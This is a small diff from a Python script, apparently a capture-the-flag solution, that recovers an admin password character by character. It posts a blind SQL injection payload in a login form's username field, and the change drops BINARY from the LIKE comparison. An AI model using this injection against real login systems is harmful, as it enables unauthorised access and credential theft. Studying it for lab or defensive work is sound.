@@ -21,7 +21,7 @@ while kyTuHienTai != '}':
             continue
         matKhauTam = matKhauHienTai + kyTuHienTai
         myobj = {
-            'username': f"admin' AND BINARY PASSWORD LIKE '{matKhauTam}%' --",
+            'username': f"admin' AND PASSWORD LIKE '{matKhauTam}%' --",
             "login": "Submit"
         }
         x = requests.post(url, data  = myobj)
